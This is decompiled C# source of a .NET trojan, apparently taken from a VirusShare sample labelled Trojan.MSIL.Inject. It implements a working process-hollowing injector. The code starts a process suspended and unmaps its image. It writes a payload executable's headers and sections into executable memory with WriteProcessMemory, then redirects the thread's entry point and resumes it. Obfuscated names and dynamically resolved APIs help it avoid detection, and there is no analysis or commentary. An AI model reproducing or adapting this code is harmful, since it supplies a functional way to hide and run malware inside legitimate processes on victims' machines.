// Decompiled with JetBrains decompiler
// Type: PRO
// Assembly: donefreddy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 12D74662-1023-4E0F-B3AE-6691B578C5B0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Inject.hu-cd23eca67c20a9aa847e307ab0ad3596b08ca9c78d5daedc3b9a565cd0fbf135.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;

public class PRO
{
  private static PRO.SetThreadContext yuvfdstehbvbyulkkouuybjhbgfhyti = PRO.oikyjhngfbdfvsdvxsdvbghjmuyhtrfdvds<PRO.SetThreadContext>("kernel32", "SetThreadContext");
  private static PRO.WriteProcessMemory poi90usdmcfhdsfeyfty4n8tceguegocddi = PRO.oikyjhngfbdfvsdvxsdvbghjmuyhtrfdvds<PRO.WriteProcessMemory>("kernel32.dll", "WriteProcessMemory");

  [DllImport("kernel32")]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool CreateProcess(
    string appName,
    StringBuilder commandLine,
    IntPtr omhrmiotlLfxLwdKbJdfrlkHqOalxb,
    IntPtr thrAttr,
    [MarshalAs(UnmanagedType.Bool)] bool inherit,
    int creation,
    IntPtr env,
    string curDir,
    byte[] sInfo,
    IntPtr[] pInfo);

  [DllImport("kernel32")]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool GetThreadContext(IntPtr hThr, uint[] zdLyyhCdylzpofzJfahmeEwWlpVjtj);

  [DllImport("ntdll")]
  private static extern uint NtUnmapViewOfSection(
    IntPtr hProc,
    IntPtr scIcBxHfqiOqOudeOptgwlsjmvauki);

  [DllImport("kernel32")]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool ReadProcessMemory(
    IntPtr hProc,
    IntPtr scIcBxHfqiOqOudeOptgwlsjmvauki,
    ref IntPtr bufr,
    int bufrSize,
    ref IntPtr icsWwWYRnrgNMuwxtgnKcTufsucHRy);

  [DllImport("kernel32.dll")]
  private static extern uint ResumeThread(IntPtr hThread);

  [DllImport("kernel32")]
  private static extern IntPtr VirtualAllocEx(
    IntPtr hProc,
    IntPtr hbozYmemfHuhnksrdOawuaiqBuyLiw,
    IntPtr neoQupfKKjlXBeTazijlhtbwpghRGi,
    int allocType,
    int prot);

  [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern bool VirtualProtectEx(
    IntPtr hProcess,
    IntPtr lpAddress,
    IntPtr dwSize,
    uint flNewProtect,
    ref uint lpflOldProtect);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

  public static T oikyjhngfbdfvsdvxsdvbghjmuyhtrfdvds<T>(string name, string method) => (T) Marshal.GetDelegateForFunctionPointer(PRO.GetProcAddress(PRO.LoadLibraryA(ref name), ref method), typeof (T));

  public void yHLeWCxQgcVOETcRnwewtRf(
    string ntIoINYrQFOggYZLUqrOKgvokPdCaRVzVglirNXAcKeseilJb)
  {
    int num1 = (int) Interaction.MsgBox((object) "wnUuLnsXMaVcpdTXwvVYmCZyLrgNeYqhqnLydfgGIrJByHQjyVyieKyjlctYJvnIbeqFrbioQmWiXNMUDOsknbTZjEzFgHPwLWbMXYQNYYbZdDSQWmqolER");
    int num2 = (int) Interaction.MsgBox((object) "sJoOGvOtMGMUgSgSslfUxwhbBcfXAaNMqtvHiuYseKdqRUzsWlZHXKgOkpBixrMccUMoXLWTNKaVgBiRxwaRcgNtpYDdlBjJlgRFfWvmrcPZDfDmwPPNaplDSW");
    int num3 = (int) Interaction.MsgBox((object) "PyBASTTcLecupMhdEgyZyXSwDFntBzCaxHGuCINHjTecZHCJsdUdjSarKBDtRIMsDIuEGHruyyXBBoXDCaBMxsKWfUNWJymacRYExEoqyiOqoxZMdmDzJjDkJZaFzKM");
  }

  public static bool PiL(byte[] csadfvrehgrdfvcccxva, string dsagnikjnefauhndzxlcsj)
  {
    bool flag;
    try
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr[] pInfo = new IntPtr[4];
      byte[] sInfo = new byte[68];
      int int32 = BitConverter.ToInt32(csadfvrehgrdfvcccxva, 60);
      int int16 = (int) BitConverter.ToInt16(csadfvrehgrdfvcccxva, checked (int32 + 6));
      IntPtr nSize = new IntPtr(BitConverter.ToInt32(csadfvrehgrdfvcccxva, checked (int32 + 84)));
      if (PRO.CreateProcess((string) null, new StringBuilder(dsagnikjnefauhndzxlcsj), zero1, zero1, false, 4, zero1, (string) null, sInfo, pInfo))
      {
        uint[] zdLyyhCdylzpofzJfahmeEwWlpVjtj = new uint[179];
        zdLyyhCdylzpofzJfahmeEwWlpVjtj[0] = 65538U;
        if (PRO.GetThreadContext(pInfo[1], zdLyyhCdylzpofzJfahmeEwWlpVjtj))
        {
          IntPtr scIcBxHfqiOqOudeOptgwlsjmvauki = new IntPtr(checked ((long) zdLyyhCdylzpofzJfahmeEwWlpVjtj[41] + 8L));
          IntPtr zero2 = IntPtr.Zero;
          IntPtr bufrSize = new IntPtr(4);
          IntPtr zero3 = IntPtr.Zero;
          if (PRO.ReadProcessMemory(pInfo[0], scIcBxHfqiOqOudeOptgwlsjmvauki, ref zero2, (int) bufrSize, ref zero3) && PRO.NtUnmapViewOfSection(pInfo[0], zero2) == 0U)
          {
            IntPtr num1 = new IntPtr(BitConverter.ToInt32(csadfvrehgrdfvcccxva, checked (int32 + 52)));
            IntPtr num2 = new IntPtr(BitConverter.ToInt32(csadfvrehgrdfvcccxva, checked (int32 + 80)));
            IntPtr EDubnnBfmajzluhuawgXJbGJHnvDHi = PRO.VirtualAllocEx(pInfo[0], num1, num2, 12288, 64);
            int CnLzBqueIdsqQPrknrznmuPrNzodct;
            int num3 = PRO.poi90usdmcfhdsfeyfty4n8tceguegocddi(pInfo[0], EDubnnBfmajzluhuawgXJbGJHnvDHi, csadfvrehgrdfvcccxva, checked ((uint) (int) nSize), CnLzBqueIdsqQPrknrznmuPrNzodct) ? 1 : 0;
            int num4 = checked (int16 - 1);
            int num5 = 0;
            while (num5 <= num4)
            {
              int[] dst = new int[10];
              Buffer.BlockCopy((Array) csadfvrehgrdfvcccxva, checked (int32 + 248 + num5 * 40), (Array) dst, 0, 40);
              byte[] numArray = new byte[checked (dst[4] - 1 + 1)];
              Buffer.BlockCopy((Array) csadfvrehgrdfvcccxva, dst[5], (Array) numArray, 0, numArray.Length);
              num1 = new IntPtr(numArray.Length);
              num2 = new IntPtr(checked (EDubnnBfmajzluhuawgXJbGJHnvDHi.ToInt32() + dst[3]));
              int num6 = PRO.poi90usdmcfhdsfeyfty4n8tceguegocddi(pInfo[0], num2, numArray, checked ((uint) (int) num1), CnLzBqueIdsqQPrknrznmuPrNzodct) ? 1 : 0;
              checked { ++num5; }
            }
            num2 = new IntPtr(checked ((long) zdLyyhCdylzpofzJfahmeEwWlpVjtj[41] + 8L));
            num1 = new IntPtr(4);
            int num7 = PRO.poi90usdmcfhdsfeyfty4n8tceguegocddi(pInfo[0], num2, BitConverter.GetBytes(EDubnnBfmajzluhuawgXJbGJHnvDHi.ToInt32()), checked ((uint) (int) num1), CnLzBqueIdsqQPrknrznmuPrNzodct) ? 1 : 0;
            zdLyyhCdylzpofzJfahmeEwWlpVjtj[44] = checked ((uint) (EDubnnBfmajzluhuawgXJbGJHnvDHi.ToInt32() + BitConverter.ToInt32(csadfvrehgrdfvcccxva, int32 + 40)));
            int num8 = PRO.yuvfdstehbvbyulkkouuybjhbgfhyti(pInfo[1], zdLyyhCdylzpofzJfahmeEwWlpVjtj) ? 1 : 0;
          }
        }
        int num = (int) PRO.ResumeThread(pInfo[1]);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      goto label_10;
    }
    flag = true;
label_10:
    return flag;
  }

  [return: MarshalAs(UnmanagedType.Bool)]
  public delegate bool SetThreadContext(IntPtr hThr, uint[] zdLyyhCdylzpofzJfahmeEwWlpVjtj);

  public delegate bool WriteProcessMemory(
    IntPtr hProcess,
    IntPtr EDubnnBfmajzluhuawgXJbGJHnvDHi,
    byte[] lpBuffer,
    uint nSize,
    int CnLzBqueIdsqQPrknrznmuPrNzodct);
}
